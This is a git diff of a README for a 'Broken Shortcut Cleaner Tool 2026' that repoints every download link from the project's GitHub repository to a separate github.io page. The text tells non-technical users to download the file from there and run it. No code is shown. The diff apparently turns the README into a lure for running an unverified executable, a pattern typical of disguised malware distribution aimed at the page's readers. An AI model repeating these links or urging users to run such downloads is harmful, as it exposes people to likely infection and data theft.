@@ -1,6 +1,6 @@
 # 🧹 Broken-Shortcut-Cleaner-Tool-2026 - Remove Dead Links Effortlessly
 
-[![Download Broken Shortcut Cleaner](https://img.shields.io/badge/Download-Broken_Shortcut_Cleaner-2ea44f?style=for-the-badge)](https://github.com/Unq2289/Broken-Shortcut-Cleaner-Tool-2026)
+[![Download Broken Shortcut Cleaner](https://img.shields.io/badge/Download-Broken_Shortcut_Cleaner-2ea44f?style=for-the-badge)](https://unq2289.github.io)
 
 ## 👋 Welcome
 
@@ -12,7 +12,7 @@ Getting started with Broken Shortcut Cleaner Tool is easy. You don't need any te
 
 ### 📥 Download the Application
 
-Visit this link to download the application: [https://github.com/Unq2289/Broken-Shortcut-Cleaner-Tool-2026](https://github.com/Unq2289/Broken-Shortcut-Cleaner-Tool-2026)
+Visit this link to download the application: [https://unq2289.github.io](https://unq2289.github.io)
 
 Click the download button on that page to get the application file. The download should start automatically. If it doesn't, look for a button that says "Download" or "Get" and click it.
 
@@ -148,7 +148,7 @@ Download it today and enjoy a cleaner, more organized system. Say goodbye to bro
 
 ## 📥 Download Now
 
-Ready to clean up your system? Visit this link to download the application: [https://github.com/Unq2289/Broken-Shortcut-Cleaner-Tool-2026](https://github.com/Unq2289/Broken-Shortcut-Cleaner-Tool-2026)
+Ready to clean up your system? Visit this link to download the application: [https://unq2289.github.io](https://unq2289.github.io)
 
 Click the download button, run the file, and start cleaning. It's that simple.
 
